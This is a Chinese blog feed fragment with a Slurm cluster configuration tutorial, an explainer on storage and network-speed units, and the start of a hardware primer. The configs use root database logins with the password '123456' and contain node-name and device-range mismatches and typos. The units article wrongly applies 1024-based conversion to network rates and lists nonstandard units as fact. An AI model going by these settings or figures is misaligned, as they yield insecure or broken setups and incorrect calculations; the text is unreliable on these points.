# SelectTypeParameters：资源选择类型参数，当SelectType=select/linear时仅支持CR_ONE_TASK_PER_CORE和CR_Memory；当SelectType=select/cons_res、SelectType=select/cray_aries和SelectType=select/cons_tres时，默认采用CR_Core_Memory
SelectTypeParameters=CR_Core_Memory
# CR_CPU: CPU核数作为可消费资源
# CR_Socket: 整颗CPU作为可消费资源
# CR_Core: CPU核作为可消费资源，默认
# CR_Memory: 内存作为可消费资源，CR_Memory假定MaxShare大于等于1
# CR_CPU_Memory: CPU和内存作为可消费资源
# CR_Socket_Memory: 整颗CPU和内存作为可消费资源
# CR_Core_Memory: CPU和和内存作为可消费资源
# Task Launch：任务启动
TaskPlugin=task/cgroup,task/affinity #设定任务启动插件。可被用于提供节点内的资源管理（如绑定任务到特定处理器），TaskPlugin值可为:
# task/affinity: CPU亲和支持（man srun查看其中--cpu-bind、--mem-bind和-E选项）
# task/cgroup: 强制采用Linux控制组cgroup分配资源（man group.conf查看帮助）
# task/none: #无任务启动动作
# Prolog and Epilog：前处理及后处理
# Prolog/Epilog: 完整的绝对路径，在用户作业开始前(Prolog)或结束后(Epilog)在其每个运行节点上都采用root用户执行，可用于初始化某些参数、清理作业运行后的可删除文件等
# Prolog=/opt/bin/prolog.sh # 作业开始运行前需要执行的文件，采用root用户执行
# Epilog=/opt/bin/epilog.sh # 作业结束运行后需要执行的文件，采用root用户执行
# SrunProlog/Epilog # 完整的绝对路径，在用户作业步开始前(SrunProlog)或结束后(Epilog)在其每个运行节点上都被srun执行，这些参数可以被srun的--prolog和--epilog选项覆盖
# SrunProlog=/opt/bin/srunprolog.sh # 在srun作业开始运行前需要执行的文件，采用运行srun命令的用户执行
# SrunEpilog=/opt/bin/srunepilog.sh # 在srun作业结束运行后需要执行的文件，采用运行srun命令的用户执行
# TaskProlog/Epilog: 绝对路径，在用户任务开始前(Prolog)和结束后(Epilog)在其每个运行节点上都采用运行作业的用户身份执行
# TaskProlog=/opt/bin/taskprolog.sh # 作业开始运行前需要执行的文件，采用运行作业的用户执行
# TaskEpilog=/opt/bin/taskepilog.sh # 作业结束后需要执行的文件，采用运行作业的用户执行行
# 顺序：
# 1. pre_launch_priv()：TaskPlugin内部函数
# 2. pre_launch()：TaskPlugin内部函数
# 3. TaskProlog：slurm.conf中定义的系统范围每个任务
# 4. User prolog：作业步指定的，采用srun命令的--task-prolog参数或SLURM_TASK_PROLOG环境变量指定
# 5. Task：作业步任务中执行
# 6. User epilog：作业步指定的，采用srun命令的--task-epilog参数或SLURM_TASK_EPILOG环境变量指定
# 7. TaskEpilog：slurm.conf中定义的系统范围每个任务
# 8. post_term()：TaskPlugin内部函数
# Event Logging：事件记录
# Slurmctld和slurmd守护进程可以配置为采用不同级别的详细度记录，从0（不记录）到7（极度详细）
SlurmctldDebug=info # 默认为info
SlurmctldLogFile=/var/log/slurm/slurmctld.log # 如是空白，则记录到syslog
SlurmdDebug=info # 默认为info
SlurmdLogFile=/var/log/slurm/slurmd.log # 如为空白，则记录到syslog，如名字中的有字符串&amp;#34;%h&amp;#34;，则&amp;#34;%h&amp;#34;将被替换为节点名
# Job Completion Logging：作业完成记录
JobCompType=jobcomp/mysql
# 指定作业完成是采用的记录机制，默认为None，可为以下值之一:
# None: 不记录作业完成信息
# Elasticsearch: 将作业完成信息记录到Elasticsearch服务器
# FileTxt: 将作业完成信息记录在一个纯文本文件中
# Lua: 利用名为jobcomp.lua的文件记录作业完成信息
# Script: 采用任意脚本对原始作业完成信息进行处理后记录
# MySQL: 将完成状态写入MySQL或MariaDB数据库
# JobCompLoc= # 设定记录作业完成信息的文本文件位置（若JobCompType=filetxt），或将要运行的脚本（若JobCompType=script），或Elasticsearch服务器的URL（若JobCompType=elasticsearch），或数据库名字（JobCompType为其它值时）
# 设定数据库在哪里运行，且如何连接
JobCompHost=localhost # 存储作业完成信息的数据库主机名
# JobCompPort=3306 # 存储作业完成信息的数据库服务器监听端口
JobCompUser=root # 用于与存储作业完成信息数据库进行对话的用户名
JobCompPass=123456 # 用于与存储作业完成信息数据库进行对话的用户密码
# Job Accounting Gather：作业记账收集
JobAcctGatherType=jobacct_gather/linux # Slurm记录每个作业消耗的资源，JobAcctGatherType值可为以下之一：
# jobacct_gather/none: 不对作业记账
# jobacct_gather/cgroup: 收集Linux cgroup信息
# jobacct_gather/linux: 收集Linux进程表信息，建议
JobAcctGatherFrequency=30 # 设定轮寻间隔，以秒为单位。若为-，则禁止周期性抽样
# Job Accounting Storage：作业记账存储
AccountingStorageType=accounting_storage/slurmdbd # 与作业记账收集一起，Slurm可以采用不同风格存储可以以许多不同的方式存储会计信息，可为以下值之一：
# accounting_storage/none: 不记录记账信息
# accounting_storage/slurmdbd: 将作业记账信息写入Slurm DBD数据库
# AccountingStorageLoc: 设定文件位置或数据库名，为完整绝对路径或为数据库的数据库名，当采用slurmdb时默认为slurm_acct_db
# 设定记账数据库信息，及如何连接
AccountingStorageHost=localhost # 记账数据库主机名
AccountingStoragePort=3306 # 记账数据库服务监听端口
AccountingStorageUser=root # 记账数据库用户名
AccountingStoragePass=123456 # 记账数据库用户密码。对于SlurmDBD，提供企业范围的身份验证，如采用于Munge守护进程，则这是应该用munge套接字socket名（/var/run/munge/global.socket.2）代替。默认不设置
# AccountingStoreFlags= # 以逗号（,）分割的列表。选项是：
# job_comment：在数据库中存储作业说明域
# job_script：在数据库中存储脚本
# job_env：存储批处理作业的环境变量
AccountingStorageTRES=gres/gpu # 设置GPU时需要
GresTypes=gpu # 设置GPU时需要
# Process ID Logging：进程ID记录，定义记录守护进程的进程ID的位置
SlurmctldPidFile=/var/run/slurmctld.pid # 存储slurmctld进程号PID的文件
SlurmdPidFile=/var/run/slurmd.pid # 存储slurmd进程号PID的文件
# Timers：定时器
SlurmctldTimeout=120 # 设定备份控制器在主控制器等待多少秒后成为激活的控制器
SlurmdTimeout=300 # Slurm控制器等待slurmd未响应请求多少秒后将该节点状态设置为DOWN
InactiveLimit=0 # 潜伏期控制器等待srun命令响应多少秒后，将在考虑作业或作业步骤不活动并终止它之前。0表示无限长等待
MinJobAge=300 # Slurm控制器在等待作业结束多少秒后清理其记录
KillWait=30 # 在作业到达其时间限制前等待多少秒后在发送SIGKILLL信号之前发送TERM信号以优雅地终止
WaitTime=0 # 在一个作业步的第一个任务结束后等待多少秒后结束所有其它任务，0表示无限长等待
# Compute Machines：计算节点
NodeName=work[1-3] CPUs=48 RealMemory=192000 Sockets=2 CoresPerSocket=24 ThreadsPerCore=1 Gres=gpu:3090:4 State=UNKNOWN
NodeName=master Gres=gpu:v100:4 CPUs=40 RealMemory=385560 Sockets=2 CoresPerSocket=20 ThreadsPerCore=1 State=UNKNOWN #GPU节点例子，主要为Gres=gpu:v100:2
# NodeName=node[1-10] # 计算节点名，node[1-10]表示为从node1、node2连续编号到node10，其余类似
# NodeAddr=192.168.1.[1-10] # 计算节点IP
# CPUs=48 # 节点内CPU核数，如开着超线程，则按照2倍核数计算，其值为：Sockets*CoresPerSocket*ThreadsPerCore
# RealMemory=192000 # 节点内作业可用内存数(MB)，一般不大于free -m的输出，当启用select/cons_res插件限制内存时使用
# Sockets=2 # 节点内CPU颗数
# CoresPerSocket=24 # 每颗CPU核数
# ThreadsPerCore=1 # 每核逻辑线程数，如开了超线程，则为2
# State=UNKNOWN # 状态，是否启用，State可以为以下之一：
# CLOUD # 在云上存在
# DOWN # 节点失效，不能分配给在作业
# DRAIN # 节点不能分配给作业
# FAIL # 节点即将失效，不能接受分配新作业
# FAILING # 节点即将失效，但上面有作业未完成，不能接收新作业
# FUTURE # 节点为了将来使用，当Slurm守护进程启动时设置为不存在，可以之后采用scontrol命令简单地改变其状态，而不是需要重启slurmctld守护进程。当这些节点有效后，修改slurm.conf中它们的State。在它们被设置为有效前，采用Slurm看不到它们，也尝试与其联系。
# 动态未来节点(Dynamic Future Nodes)：
# slurmd启动时如有-F[&amp;lt;feature&amp;gt;]参数，将关联到一个与slurmd -C命令显示配置(sockets、cores、threads)相同的配置的FUTURE节点。节点的NodeAddr和NodeHostname从slurmd守护进程自动获取，并且当被设置为FUTURE状态后自动清除。动态未来节点在重启时保持non-FUTURE状态。利用scontrol可以将其设置为FUTURE状态。
# 若NodeName与slurmd的HostName映射未通过DNS更新，动态未来节点不知道在之间如何进行通信，其原因在于NodeAddr和NodeHostName未在slurm.conf被定义，而且扇出通信(fanout communication)需要通过将TreeWidth设置为一个较高的数字（如65533）来使其无效。若做了DNS映射，则可以使用cloud_dns SlurmctldParameter。
# UNKNOWN # 节点状态未被定义，但将在节点上启动slurmd进程后设置为BUSY或IDLE，该为默认值。
PartitionName=batch Nodes=node[1-3] Default=YES MaxTime=INFINITE State=UP
PartitionName=master nodes=master Default=NO MaxTime=INFINTE State=UP
# PartitionName=batch # 队列分区名
# Nodes=node[1-10] # 节点名
# Default=Yes # 作为默认队列，运行作业不知明队列名时采用的队列
# MaxTime=INFINITE # 作业最大运行时间，以分钟为单位，INFINITE表示为无限制
# State=UP # 状态，是否启用
# Gres=gpu:v100:2 # 设置节点有两块v100 GPU卡，需要在GPU节点 /etc/slum/gres.conf 文件中有类似下面配置：
#AutoDetect=nvml
Name=gpu Type=v100 File=/dev/nvidia[0-1] #设置资源的名称Name是gpu，类型Type为v100，名称与类型可以任意取，但需要与其它方面配置对应，File=/dev/nvidia[0-1]指明了使用的GPU设备。
#Name=mps Count=100
&lt;/code>&lt;/pre>&lt;h4 id="配置gpu资源文件etcslurmgresconf">配置GPU资源文件/etc/slurm/gres.conf&lt;/h4>
&lt;p>gres.conf也尽量也应当所有的集群节点也都配置相关参数（&lt;del>存疑&lt;/del>）&lt;/p>
&lt;pre tabindex="0">&lt;code># AutoDetect=nvml
Name=gpu Type=3090 File=/dev/nvidia[0-4]
#设置资源的名称Name是gpu，类型Type为3090，名称与类型可以任意取，但需要与其它方面配置对应，File=/dev/nvidia[0-1]指明了使用的GPU设备。
&lt;/code>&lt;/pre>&lt;h4 id="配置slurmdbd">配置slurmdbd&lt;/h4>
&lt;pre tabindex="0">&lt;code># Authentication info 一些munge的认证信息
AuthType=auth/munge
AuthInfo=/var/run/munge/munge.socket.2
# DebugLevel=info
# slurmDBD info slurmdbd相关的配置信息
DbdHost=slurmmaster
DbdPort=6819
SlurmUser=root
DebugLevel=verbose
LogFile=/var/log/slurm/slurmdbd.log
# Database info 连接mysql的相关信息
StorageType=accounting_storage/mysql
StorageHost=slurmmaster
StoragePort=3306
StoragePass=123456
StorageUser=root
StorageLoc=slurm_acct_db
&lt;/code>&lt;/pre>&lt;h4 id="启动slurm服务master节点">启动slurm服务master节点&lt;/h4>
&lt;pre tabindex="0">&lt;code>sudo systemctl start slurmd
sudo systemctl start slurmctld
sudo systemctl start slurmdbd
sudo systemctl status slurmd # 确保是运行状态
sudo systemctl status slurmctld # 确保是运行状态
sudo systemctl status slurmdbd
sudo systemctl enable slurmctld # 开机自启
sudo systemctl enable slurmd # 开机自启
sudo systemctl enable slurmdbd # 开机自启
&lt;/code>&lt;/pre>&lt;h4 id="启动slurm从节点">启动slurm从节点&lt;/h4>
&lt;pre tabindex="0">&lt;code>sudo systemctl start slurmd
sudo systemctl enable slurmd
&lt;/code>&lt;/pre>&lt;h3 id="sharding-配置">sharding 配置&lt;/h3>
&lt;p>sharding是slurm23.04最新推出的基于nvidia 企业级GPU（例如A100）等，方便用户在一个GPU上同时平行计算多个任务（而非按照一个任务GPU独占的方式，最大化利用GPU资源）的功能。&lt;/p>
&lt;p>&lt;strong>该功能仅支持在企业级GPU以及slurm23.04版本之后&lt;/strong>&lt;/p>
&lt;h3 id="配置etcgresconf">配置/etc/gres.conf&lt;/h3>
&lt;pre tabindex="0">&lt;code># Example 1 of gres.conf
# Configure four GPUs (with Sharding)
# AutoDetect=nvml
Name=gpu Type=A100 File=/dev/nvidia[0-3]
# Set gres/shard Count value to 8 on each of the 4 available GPUs
Name=shard Count=32
&lt;/code>&lt;/pre>&lt;p>上述配合文件也可以写成如下格式,二者含义等价&lt;/p>
&lt;pre tabindex="0">&lt;code>Name=gpu Type=A100 File=/dev/nvidia0
Name=gpu Type=A100 File=/dev/nvidia1
Name=gpu Type=A100 File=/dev/nvidia2
Name=gpu Type=A100 File=/dev/nvidia3
Name=shard Count=8 File=/dev/nvidia0
Name=shard Count=8 File=/dev/nvidia1
Name=shard Count=8 File=/dev/nvidia2
Name=shard Count=8 File=/dev/nvidia3
&lt;/code>&lt;/pre>&lt;h4 id="配置sharding">配置sharding&lt;/h4>
&lt;p>修改slurm.conf配置文件中需要分享GPU资源的节点参数&lt;/p>
&lt;pre tabindex="0">&lt;code>AccountingStorageTRES=gres/gpu,gres/shard
GresTypes=gpu,shard
NodeName=master Gres=gpu:4,shard:32
&lt;/code>&lt;/pre>&lt;p>如上配置，将使得master节点上的四张gpu每个gpu都可以同时跑最多8个任务，也就是合计32个任务。&lt;/p>
&lt;h4 id="将配置文件分发到所有主从节点">将配置文件分发到所有主从节点&lt;/h4>
&lt;p>&lt;strong>注意：一定保证所有主从节点的slurm.conf配置文件一致性，以及gres.conf的一致性&lt;/strong>&lt;/p>
&lt;h4 id="重启所有主从节点的slurm相关服务">重启所有主从节点的slurm相关服务&lt;/h4>
&lt;pre tabindex="0">&lt;code>sudo systemctl restart slurmd
sudo systemctl restart slurmctld
&lt;/code>&lt;/pre></description><category domain="https://yuukisama.cc/categories/code/">CODE</category></item><item><title>计算机存储单位详解</title><link>https://yuukisama.cc/posts/code/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%AD%98%E5%82%A8%E5%8D%95%E4%BD%8D%E8%AF%A6%E8%A7%A3/</link><guid isPermaLink="true">https://yuukisama.cc/posts/code/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%AD%98%E5%82%A8%E5%8D%95%E4%BD%8D%E8%AF%A6%E8%A7%A3/</guid><pubDate>Tue, 07 Mar 2023 13:54:47 +0800</pubDate><author>chainyuuki@gmail.com (Yuuki)</author><copyright>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</copyright><description>&lt;h1 id="计算机存储单位详解">计算机存储单位详解&lt;/h1>
&lt;p>本文将通过较为接近基础原理的方式讲解计算机中有关存储容量单位的相关知识点。&lt;/p>
&lt;p>&lt;em>本章节阅读前需要的知识储备：九年之义务教育的数学计算能力以及语文阅读能力。&lt;/em>&lt;/p>
&lt;p>不论你是不是计算机相关专业的人员，相信你都听说过一句话：&lt;strong>计算机世界是1和0的世界&lt;/strong>（&lt;del>不是那个01啊喂！&lt;/del>），因此本文将会涉及到非常多的2的次方运算，准确的说，计算机存储容量的换算方式就是基于2的多少次方进行的，即2的幂运算，即二进制。&lt;/p>
&lt;h2 id="二进制">二进制&lt;/h2>
&lt;p>我们常规的十进制运算是满10进1，理解这个概念后可以类比2进制，即满2进1。例如如果我们用十进制数数是这样的：&lt;/p>
&lt;pre tabindex="0">&lt;code>0，1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13， 14, 15, 16 ……
&lt;/code>&lt;/pre>&lt;p>如果用二进制的方式数数就是（下面我们数到了16,和上面一样，每一位都可以对照起来看）：&lt;/p>
&lt;pre tabindex="0">&lt;code>0, 1, 10, 11, 100, 101, 110, 111, 1000, 1001, 1010, 1011, 1100, 1101, 1110, 1111, 10000 ……
&lt;/code>&lt;/pre>&lt;h2 id="位-bit-比特">位 bit 比特&lt;/h2>
&lt;p>&lt;strong>位（bit）计算机中最小的计量单位——比特&lt;/strong>&lt;/p>
&lt;p>我们在电脑中所看到的任何东西，文本，网页，图片，音频，视频……它们归根结底存储在计算机的磁盘中都是一串0和1组成的数字。最早的时候，在第一台计算机诞生时，我们用打孔纸带表示01，现在我们在计算机里用电压高地，逻辑门开关表示01。&lt;/p>
&lt;p>计算机中，一位数字0,或者一位数字1，即一个二进制位，我们称之为 “&lt;strong>位&lt;/strong>”，英文写作&lt;strong>bit&lt;/strong>，中文写作“&lt;strong>比特&lt;/strong>”（&lt;strong>必须是小写的b，大写B和小写b是两个不同的单位&lt;/strong>），可以简写成 1 bit。1bit的数据就是一位只能表示0,或者1。&lt;/p>
&lt;h2 id="字节byte">字节Byte&lt;/h2>
&lt;p>&lt;strong>8个二进制位，即 8 bit 记为1Byte， 1字节&lt;/strong>&lt;/p>
&lt;p>在早期计算机中，计算机科学家们定义了一套编码表，把二进制数字和一系列字母符号对应起来并一直沿用至今称之为“&lt;strong>ASCII码表&lt;/strong>”（ American Standard Code for Information Interchange，美国信息交换标准代码），就像电报一样，我们规定三长三短表示SOS,在ASCII码表里，我们规定 1000001 表示大写字母 A。 以此类推，将大小写英文字母以及一些常用符号映射成了二进制。而恰好这个编码表每一个数据的长度都是8个二进制位，即8bit表示一个字母，所以我们把 8bit 记作 1Byte字节。&lt;/p>
&lt;p>&lt;em>题外话，综上在某些时候的计算机内一个字母一个字符的长度就是1 Byte，8 bit的长度。而早期汉字编码则是使用两个字节来表示一个汉字，即 2Byte, 16bit&lt;/em>&lt;/p>
&lt;p>&lt;a href="http://c.biancheng.net/c/ascii">详细的ASCII码表&lt;/a>&lt;/p>
&lt;h2 id="基础容量单位换算">基础容量单位换算&lt;/h2>
&lt;p>在弄明白 bit 和 Byte 后，恭喜这个只是点的地基已经被打好了。在这两个单位基础上我们总结一下常见计算机单位容量换算机制：&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>-&lt;/th>
&lt;th>-&lt;/th>
&lt;th>-&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>8 bit（8比特）&lt;/td>
&lt;td>1Byte&lt;/td>
&lt;td>1字节&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>1024 Byte&lt;/td>
&lt;td>1 KB （KiloByte）&lt;/td>
&lt;td>1千字节&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>1024 KB&lt;/td>
&lt;td>1 MB （MegaByte）&lt;/td>
&lt;td>1兆字节&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>1024 MB&lt;/td>
&lt;td>1 GB （GigaByte）&lt;/td>
&lt;td>1吉字节&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>1024 GB&lt;/td>
&lt;td>1 TB （TeraByte）&lt;/td>
&lt;td>1太字节&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>1024 TB&lt;/td>
&lt;td>1 PB （PetaByte）&lt;/td>
&lt;td>1拍字节&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>1024 PB&lt;/td>
&lt;td>1 EB （ExaByte）&lt;/td>
&lt;td>1艾字节&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>1024 EB&lt;/td>
&lt;td>1 ZB （ZetaByte）&lt;/td>
&lt;td>1泽字节&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>1024 ZB&lt;/td>
&lt;td>1 YB （YottaByte）&lt;/td>
&lt;td>1尧字节&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>1024 YB&lt;/td>
&lt;td>1 BB（Brontobyte）&lt;/td>
&lt;td>1珀字节&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>1024 BB&lt;/td>
&lt;td>1 NB （NonaByte）&lt;/td>
&lt;td>1诺字节&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>1024 NB&lt;/td>
&lt;td>1 DB （DoggaByte）&lt;/td>
&lt;td>1刀字节&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;p>目前常用到的单位是从bit到PB. 除去bit到字节是 8 的换算，其他都是 1024 倍的关系，即 2^10 二的十次方。&lt;/p>
&lt;h2 id="实际硬盘容量">实际硬盘容量&lt;/h2>
&lt;p>在说到内存，或者是现存大小的时候，以上单位大小是准确的。但是常接触硬盘的人可能会有疑问，因为标称1TB的硬盘到手总是可能只有900GB左右。&lt;/p>
&lt;p>这点是因为硬盘厂商为了方便硬盘的制造，都有自己的换算方式（&lt;del>缺斤少两&lt;/del>）。比如我们购买一个标称1TB的硬盘，到手可能只有930GB左右。硬盘厂商实际上是这么算的。&lt;/p>
&lt;ul>
&lt;li>
&lt;p>同样是以8bit为1Byte,到这里还没有问题。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>但是到了Byte 到 KB的时候，以及KB 到 MB, MB到GB的时候厂商都是以1000计的，而不是1024。于是乎我们可以列出公式得出：&lt;/p>
&lt;pre tabindex="0">&lt;code>厂商： 1TB = 1Byte * 1000 * 1000 * 1000 * 1000 = 10^12 = 1000000000000 Byte
&lt;/code>&lt;/pre>&lt;p>而这 10^12次方 Byte 用真正的 1024 的方法换算即:&lt;/p>
&lt;pre tabindex="0">&lt;code>10^12 Byte / 1024 = 976562500 KB
976562500 KB / 1024 = 953674.31640625 MB
953674.31640625 MB /1024 = 931.3225746154785 GB
&lt;/code>&lt;/pre>&lt;/li>
&lt;/ul>
&lt;p>于是乎你就做到了买1TB的硬盘实际到手 931GB。&lt;/p>
&lt;h2 id="速度单位">速度单位&lt;/h2>
&lt;p>在之前的章节之中，我们强调了&lt;/p>
&lt;p>&lt;strong>Byte 和 bit, 大写B和小写b是两个完全不同的单位！&lt;/strong>&lt;/p>
&lt;p>&lt;strong>Byte 和 bit, 大写B和小写b是两个完全不同的单位！&lt;/strong>&lt;/p>
&lt;p>&lt;strong>Byte 和 bit, 大写B和小写b是两个完全不同的单位！&lt;/strong>&lt;/p>
&lt;p>这里重要的事情说三遍！！！&lt;/p>
&lt;p>在描述计算机网络速度的时候，我们不再以字节Byte，大B为基准，而是以比特bit,小b为基准。并由此诞生了一系列的新的速度单位：&lt;/p>
&lt;ul>
&lt;li>bps（bit per second）比特每秒，也称作比特率&lt;/li>
&lt;li>Kbps （kilobit per second）千比特每秒&lt;/li>
&lt;li>Mbps （Megabit per second）兆比特每秒&lt;/li>
&lt;li>Gbps&lt;/li>
&lt;li>Tbps&lt;/li>
&lt;li>……&lt;/li>
&lt;/ul>
&lt;p>当然其实有时候为了更方便常规的认知，我们也有以Byte，大写B为基准的速度单位：&lt;/p>
&lt;ul>
&lt;li>Byte/s （Byte per second）字节每秒&lt;/li>
&lt;li>KB/s （KiloByte per second）千字节每秒&lt;/li>
&lt;li>MB/s （MegaByte per second）兆字节每秒&lt;/li>
&lt;li>……&lt;/li>
&lt;/ul>
&lt;p>其他单位以此类推。&lt;/p>
&lt;p>&lt;strong>综上所述，kb和kB是两个完全不同的单位！一个是千比特一个是千字节（k的大小写其实是无所谓的）Mb和MB也是两个完全不同的单位，一个是兆比特，一个是兆字节。&lt;/strong>&lt;/p>
&lt;h2 id="速率换算">速率换算&lt;/h2>
&lt;p>在有了之前的容量换算的基础后，我们可以很轻松的推理速率换算之间的关系。首先你需要搞清楚其单位究竟是大B还是小b,是基于字节Byte的还是基于bit的。除去比特和字节的差异，千K到兆M，兆M到吉G还是和容量单位一样基于1024换算。&lt;/p>
&lt;p>&lt;strong>8 bit = 1 Byte&lt;/strong>&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>-&lt;/th>
&lt;th>-&lt;/th>
&lt;th>-&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>1 Byte/s&lt;/td>
&lt;td>8 bps&lt;/td>
&lt;td>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>1 KB/s&lt;/td>
&lt;td>1024 * 8 = 2^10 * 2^3 = 2^13 bps&lt;/td>
&lt;td>8 Kbps&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>1 MB/s&lt;/td>
&lt;td>1024 * 1024 * 8 = 2^23 bps&lt;/td>
&lt;td>8Mbps&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>1 GB/s&lt;/td>
&lt;td>1024^3 * 8 = 2^33 bps&lt;/td>
&lt;td>8Gbps&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;p>&lt;em>Kbps也可以写作Kb/s,但是和KB/s不是同一个单位，同样数字的情况下后者是前者的8倍大，当然KB/s也可以写作KBps,其他单位以此类推。&lt;/em>&lt;/p>
&lt;p>以此类推，我们可以得到，大写B到小写b单位的转换都是以8为单位换算的。&lt;/p>
&lt;h2 id="运营商的速度概念">运营商的速度概念&lt;/h2>
&lt;h3 id="千兆宽带">千兆宽带&lt;/h3>
&lt;p>在日常生活里我们常常有听到这样的宣传词，尤其是办理宽带的时候：&lt;/p>
&lt;pre>&lt;code>我们的宽带是千兆宽带，万兆宽带，或者是百兆宽带。
&lt;/code>&lt;/pre>
&lt;p>其实这里运营商们玩了个文字游戏，这里说的兆是指Mb而非MB&lt;/p>
&lt;p>让我们来用所谓的千兆宽带为例，即运营商嘴里的1000M宽带，来算算其真正的实际速率。&lt;/p>
&lt;pre tabindex="0">&lt;code>这里的 1000M 即 1000Mbps
1000 Mbps = 1000 * 1024 （kbps） = 1000 * 1024 * 1024 bps
而 8 bit = 1 Byte， 所以：
1000 Mbps = 1000 * 1024 * 1024 / 8（MB/s）= 125 MB/s
当然其实可以简单点直接除以8,即：
1000Mb = 1000 / 8 = 125MB/s
&lt;/code>&lt;/pre>&lt;h3 id="25g网口">2.5G网口&lt;/h3>
&lt;p>第二个离子是2.5G网口，即我们目前可以买到的较为新的电脑基本都配备了一个2.5G网口，那么这个网口的真实最大下载速度是多少呢？&lt;/p>
&lt;pre tabindex="0">&lt;code>2.5G网口即 2.5Gbps 网口
2.5Gbps = 2.5 * 1024 (Mbps) = 2.5 * 1024 / 8 (MB/s) = 320MB/s
&lt;/code>&lt;/pre>&lt;h3 id="万兆">万兆&lt;/h3>
&lt;p>那如果是万兆呢，即10000Mbps&lt;/p>
&lt;pre tabindex="0">&lt;code>10000 Mbps = 10000 / 8 （MB/s） = 1250 MB/s
&lt;/code>&lt;/pre>&lt;p>&lt;del>勉强达到了1GB每秒的下载速度&lt;/del>&lt;/p>
&lt;h3 id="速率总结">速率总结&lt;/h3>
&lt;p>我们常规听到的宣传网络速度，网络带宽的单位事实上都是基于比特bit的单位，例如：&lt;/p>
&lt;ul>
&lt;li>5G网络的峰值速度是10-20Gbps。&lt;/li>
&lt;li>宽带速度是1000Mbps&lt;/li>
&lt;li>服务器带宽是10Mbps&lt;/li>
&lt;/ul></description></item><item><title>计算机硬件知识科普</title><link>https://yuukisama.cc/posts/code/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A1%AC%E4%BB%B6%E7%9F%A5%E8%AF%86%E7%A7%91%E6%99%AE/</link><guid isPermaLink="true">https://yuukisama.cc/posts/code/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A1%AC%E4%BB%B6%E7%9F%A5%E8%AF%86%E7%A7%91%E6%99%AE/</guid><pubDate>Tue, 10 Jan 2023 14:19:26 +0800</pubDate><author>chainyuuki@gmail.com (Yuuki)</author><copyright>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</copyright><description>&lt;h1 id="计算机硬件知识科普">计算机硬件知识科普&lt;/h1>
&lt;p>一篇简单的计算机硬件科普文，将简单从计算机各个硬件组成来普及个人 pc 以及简单服务器 pc 的硬件组成及品牌硬件参数知识。如有纰漏还望指正。本文的目的，是为了向小白快速普及计算机硬件知识，所以涉及偏向学术性质的原理知识这里可能会简单一笔带过。&lt;/p>
&lt;h2 id="计算机的理论组成">计算机的理论组成&lt;/h2>
&lt;p>现代计算机的结构组成脱胎于“冯 诺依曼结构”，所以冯诺依曼也被称为计算机之父，该理论下计算机由如下四个部分组成：&lt;/p>
&lt;ol>
&lt;li>
&lt;p>运算器&lt;/p>
&lt;p>运算器这里映射到现代计算机设备就是我们常规意义上的处理器（CPU）中负责数据运算的部分&lt;/p>
&lt;/li>
&lt;li>
&lt;p>控制器&lt;/p>
&lt;p>控制器在现代计算机设备中被集成在处理器（CPU）中，简单讲其功能是负责指挥，控制指令的执行。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>存储器&lt;/p>
&lt;p>存储设备顾名思义，负责数据的存储，泛指各类存储，缓存等等。我们可以把电脑内存，硬盘等归类为存储器&lt;/p>
&lt;/li>
&lt;li>
&lt;p>输入设备&lt;/p>
&lt;p>输入设备，是人与计算机交互的设备，在早期计算机中人们采用&lt;a href="https://baike.baidu.com/item/%E7%A9%BF%E5%AD%94%E7%BA%B8%E5%B8%A6/1234150?fromModule=search-result_lemma">打孔纸带&lt;/a>的方式与计算机交互。在现代计算机中，鼠标键盘，触摸屏（触摸这个特性），以及未来可能出现的脑机接口等都可以归类为输入设备。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>输出设备&lt;/p>
&lt;p>输出设备这里常规包括最基础的显示器。当然打印机等也可以算作输出设备。&lt;/p>
&lt;/li>
&lt;/ol>
&lt;h2 id="计算机真实硬件组成">计算机真实硬件组成&lt;/h2>
&lt;p>讨论完理论性质上的组成，这一篇将描述实质上现代计算机中常规的硬件组成。这里我们排除各类输入输入设备，例如显示器，鼠标键盘等外部设备，将目光聚焦到主机本身上。&lt;/p>
&lt;p>一个主机基本上包括如下配件&lt;/p>
&lt;ol>
&lt;li>
&lt;p>主板（Motherboard/Mainboard）&lt;/p>
&lt;p>主板的主要功能是提供一系列的插槽，规范化的接口，形成一个能够集成处理器，内存，存储设备，显卡，声卡，网卡等等和外部设备连接的平台，其他接下来的设备通过特定接口连接到主板。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>中央处理器(CPU, Central Processing Unit)&lt;/p>
&lt;p>计算机的大脑，负责运算处理数据&lt;/p>
&lt;/li>
&lt;li>
&lt;p>内存（Memory）&lt;/p>
